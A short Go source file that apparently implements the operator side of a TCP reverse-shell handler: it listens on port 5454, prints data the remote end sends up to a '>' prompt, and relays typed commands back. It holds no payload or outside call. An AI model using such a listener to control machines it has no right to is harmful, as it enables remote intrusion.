package main

import (
  "fmt"
  "net"
  "bufio"
//  "time"
  "os"
)

func ListenForConnection() net.Conn {
  listener, _ := net.Listen("tcp4", ":5454")
  conn, _ := listener.Accept()
  fmt.Println("TCP connection accepted")
  return conn
}

func ListenAndHandleTCPShell(){
  fmt.Println("hello from the other thread")
  conn := ListenForConnection()
  defer conn.Close()
  stdreader := bufio.NewReader(os.Stdin)
  reader := bufio.NewReader(conn)
  writer := bufio.NewWriter(conn)
  go func() {
    for{
      tcpdata, _ := reader.ReadString('>')
      fmt.Print(tcpdata)
    }
  }()
  for{
    text, _ := stdreader.ReadString('\n')
    writer.WriteString(text)
    writer.Flush()
  }
}
